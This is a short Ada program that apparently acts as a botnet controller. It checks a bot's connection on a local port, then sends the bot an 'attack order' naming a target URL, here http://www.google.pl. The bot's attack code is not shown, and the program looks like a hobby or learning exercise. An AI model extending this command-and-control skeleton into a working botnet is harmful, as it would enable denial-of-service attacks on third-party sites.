with Ada.Text_IO; use Ada.Text_IO;
with GNAT.Sockets; use GNAT.Sockets;
with Ada.Exceptions; use Ada.Exceptions;
with connection; use connection;

procedure main is
	
	targetURI : String := "";
	isSuccessful : boolean;
	
	function check_bot_connection (botAddress: in String) return boolean is 
	begin
		initiate_connection(botAddress, 2345);
		return true;
		exception
			when SOCKET_ERROR =>
				return false;
	end check_bot_connection;


	procedure attack_order (botAddress, targetURI: in String) is
	begin
		initiate_connection(botAddress, 2346);
		write_message_to_socket(targetURI); -- message is targetURI
	end attack_order;

begin

	isSuccessful := check_bot_connection("127.0.0.1");
	if(isSuccessful) then 
		put_line("connected!");
	else
		put_line("not connected");
	end if;

	attack_order("127.0.0.1", "http://www.google.pl");
end main;